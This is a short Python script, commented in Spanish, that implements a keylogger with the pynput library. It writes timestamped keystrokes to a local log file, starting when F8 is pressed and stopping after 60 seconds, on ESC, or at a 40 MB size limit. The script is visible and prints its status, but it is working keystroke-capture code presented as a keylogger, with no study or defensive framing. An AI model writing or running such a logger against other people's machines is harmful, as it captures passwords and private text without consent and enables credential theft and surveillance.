# Módulos necesarios
from pynput import keyboard
import time
import threading
import os

# Variables de control
log_file = "log.txt"
log_size_limit = 40 * 1024 * 1024  # 40 MB en bytes
registro_activo = False
tiempo_registro = 60  # segundos
tecla_activadora = keyboard.Key.f8  # Activás con F8
tecla_desactivadora = keyboard.Key.esc  # Desactivás con ESC (opcional)

# Función para guardar tecla
def guardar_tecla(key):
    global registro_activo
    if not registro_activo:
        return

    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key}\n")
    except Exception as e:
        print(f"Error al guardar: {e}")

    # Condición de parada por tamaño
    if os.path.exists(log_file) and os.path.getsize(log_file) > log_size_limit:
        print("Tamaño máximo alcanzado. Finalizando registro.")
        registro_activo = False

# Función para iniciar el registro por tiempo
def iniciar_temporizador():
    global registro_activo
    registro_activo = True
    print("Keylogger activado.")
    time.sleep(tiempo_registro)
    registro_activo = False
    print("Keylogger desactivado (por tiempo).")

# Manejador de eventos de teclado
def on_press(key):
    global registro_activo
    if key == tecla_activadora and not registro_activo:
        threading.Thread(target=iniciar_temporizador).start()
    elif key == tecla_desactivadora and registro_activo:
        print("Keylogger desactivado manualmente.")
        registro_activo = False
    else:
        guardar_tecla(key)

# Iniciar el listener
with keyboard.Listener(on_press=on_press) as listener:
    print("Esperando activación (F8)...")
    listener.join()
